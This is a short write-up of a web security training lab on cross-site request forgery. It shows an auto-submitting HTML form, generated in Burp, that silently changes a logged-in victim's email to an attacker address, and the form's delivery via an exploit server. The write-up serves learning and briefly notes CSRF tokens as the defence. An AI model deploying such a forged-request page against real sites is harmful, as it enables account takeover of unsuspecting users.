## Detailed writeup of Csrf Apprentice lab(**CSRF vulnerability with no defenses**)

Date:- 6 Jan 2025
Level:- Apprentice

This lab contain a CSRF Vunerablity in email section of users account which 
can lead to change in the email and redirection  of content to anathor account easily.

At first we were provided the credential as 
-Username:wiener
-Password:peter

**At first i get login into the account using the given credentials**

Then, there is option of updating the email in which i enter email named **test11@gmail.com**

**I capture the request at Burp-Proxy and send it to repeater**

 Then, i changed the email and send it and it shows **302-Found**

I get to discover that we can change the email easily so i select the particular
request of change/email to **Engagement tool** then select **CSRF PoC generator**

#I copy the HTML content as shown below:-

```html
<html>
<body>
  <form action="https://0a3500a604127aaa801e26a800ab004b.web-security-academy.net/my-account/change-email" method="POST">
    <input type="hidden" name="email" value="testjg&#64;evil&#46;com" />
    <input type="submit" value="Submit request" />
  </form>
  <script>
    history.pushState('', '', '/');
    document.forms[0].submit();
  </script>
</body>
</html>

Then i moved to the lab dasboard and go to **Go to Exploit Server** tab where i found body section and i uploaded the html code provided above in the writeup.

-I store the content,confirm the exploit by **View Exploit** and and deliver exploit to victim
i simply change the email address and boom We,Solved the lab!!!

## Key Learning:- If there is no defense on the website then an attacker can easily redirect or modify the data easily.

## Prevention:- For defence use csrf_token.

Thankyou!!




